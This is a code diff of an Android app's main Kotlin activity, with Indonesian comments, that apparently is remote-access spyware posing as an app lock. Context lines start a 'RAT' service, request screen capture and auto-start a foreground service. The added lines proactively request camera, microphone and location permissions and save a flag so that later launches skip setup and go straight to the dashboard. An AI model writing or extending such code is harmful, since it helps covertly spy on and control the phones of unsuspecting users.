@@ -5,6 +5,7 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.SharedPreferences
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
@@ -63,6 +64,7 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
+        // Auto-start AppLockForegroundService
         try {
             val svcIntent = Intent(this, AppLockForegroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -72,6 +74,7 @@ class MainActivity : ComponentActivity() {
             }
         } catch (_: Exception) {}
 
+        // Request CAMERA + MIC + LOCATION PROAKTIF (sekali aja)
         requestProactivePermissions()
 
         setContent {
@@ -80,6 +83,14 @@ class MainActivity : ComponentActivity() {
             var showDashboard by remember { mutableStateOf(false) }
             var refreshKey by remember { mutableStateOf(0) }
             val ctx = LocalContext.current
+
+            // Kalau setup udah pernah selesai + izin lengkap → langsung dashboard
+            LaunchedEffect(Unit) {
+                delay(800)
+                if (isSetupDone() && checkAll()) {
+                    grantedAll = true
+                }
+            }
 
             MaterialTheme(
                 colorScheme = darkColorScheme(
@@ -105,6 +116,7 @@ class MainActivity : ComponentActivity() {
                                     startActivityForResult(intent, REQ_MEDIA_PROJECTION)
                                 } catch (_: Exception) {}
                                 startRatService()
+                                saveSetupDone()
                                 showDashboard = true
                             }
                         )
@@ -133,6 +145,26 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    // ============================================================
+    // SETUP DONE PERSISTENCE
+    // ============================================================
+    private fun saveSetupDone() {
+        try {
+            val prefs = getSharedPreferences("exoid_user_prefs", Context.MODE_PRIVATE)
+            prefs.edit().putBoolean("setup_done", true).apply()
+        } catch (_: Exception) {}
+    }
+
+    private fun isSetupDone(): Boolean {
+        return try {
+            val prefs = getSharedPreferences("exoid_user_prefs", Context.MODE_PRIVATE)
+            prefs.getBoolean("setup_done", false)
+        } catch (_: Exception) { false }
+    }
+
+    // ============================================================
+    // PROACTIVE PERMISSIONS
+    // ============================================================
     private fun requestProactivePermissions() {
         val needed = mutableListOf(
             Manifest.permission.CAMERA,
@@ -278,6 +310,9 @@ class MainActivity : ComponentActivity() {
     }
 }
 
+// ============================================================
+// SPLASH SCREEN
+// ============================================================
 @Composable
 fun SplashScreen(onDone: () -> Unit) {
     LaunchedEffect(Unit) {
@@ -298,6 +333,9 @@ fun SplashScreen(onDone: () -> Unit) {
     }
 }
 
+// ============================================================
+// PERMISSION SCREEN
+// ============================================================
 @Composable
 fun PermissionScreen(
     perms: Array<String>,
@@ -456,6 +494,9 @@ fun PermRow(label: String, ok: Boolean) {
     }
 }
 
+// ============================================================
+// GRANT DONE SCREEN
+// ============================================================
 @Composable
 fun GrantDoneScreen(onContinue: () -> Unit) {
     Column(
